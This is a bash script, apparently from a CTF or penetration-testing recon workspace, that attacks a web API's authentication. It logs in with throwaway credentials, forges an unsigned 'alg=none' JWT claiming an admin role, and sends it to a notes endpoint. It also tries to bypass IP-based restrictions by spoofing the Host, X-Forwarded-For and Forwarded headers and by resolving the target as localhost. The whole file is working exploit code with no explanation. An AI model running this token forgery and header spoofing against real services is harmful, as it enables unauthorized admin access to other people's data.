#!/usr/bin/env bash
set -euo pipefail
IP=${1:?IP}
PORT=${2:?PORT}
TO=${3:-8}
BASE_OUT=${4:-/workspace/recon/httpx}
OUT_DIR="$BASE_OUT/${IP}_${PORT}"
mkdir -p "$OUT_DIR/none"
API_BASE="http://$IP:$PORT"
# Ensure token
if [[ ! -s "$OUT_DIR/login.json" ]]; then
  jq -n --arg email "a@a.com" --arg password "a" '{email:$email,password:$password}' > "$OUT_DIR/creds.json"
  curl -fsS -m 12 --connect-timeout 8 -H 'Content-Type: application/json' -d @"$OUT_DIR/creds.json" "$API_BASE/api/auth/login" > "$OUT_DIR/login.json"
fi
# Build alg=none token
NONE=$(python3 - <<'PY'
import json,base64,time,sys
from pathlib import Path
out=Path(sys.argv[1])
login=json.loads(out.read_text())
h,p,_=login['token'].split('.')
now=int(time.time())
payload={'id':'00000000-0000-0000-0000-000000000001','email':'admin@local','iat':now,'exp':now+3600,'role':'admin','isAdmin':True}
hb=base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').decode().rstrip('=')
pb=base64.urlsafe_b64encode(json.dumps(payload,separators=(',',':')).encode()).decode().rstrip('=')
print(hb+'.'+pb+'.')
PY
"$OUT_DIR/login.json")
printf "%s" "$NONE" > "$OUT_DIR/none/token_none.txt"
# Try requests
req() { local name="$1"; shift; curl -fsS -m "$TO" --connect-timeout "$TO" -i -H "Authorization: Bearer $NONE" "$@" > "$OUT_DIR/none/${name}.head" 2>/dev/null || true; }
# 1) Plain
req plain "$API_BASE/api/notes/all"
# 2) With Host localhost
req host_local -H 'Host: localhost' "$API_BASE/api/notes/all"
# 3) With resolve to localhost authority
curl -fsS -m "$TO" --connect-timeout "$TO" --resolve "localhost:$PORT:$IP" -i -H "Authorization: Bearer $NONE" "http://localhost:$PORT/api/notes/all" > "$OUT_DIR/none/resolve_local.head" 2>/dev/null || true
# 4) With XFF & Forwarded
req xff_local -H 'X-Forwarded-For: 127.0.0.1' -H 'X-Real-IP: 127.0.0.1' -H 'Forwarded: for=127.0.0.1;host=localhost;proto=http' "$API_BASE/api/notes/all"
# Show statuses
rg -n "^HTTP/1\\.[01] [0-9]{3}" -S "$OUT_DIR/none" | sed -n '1,80p' || true
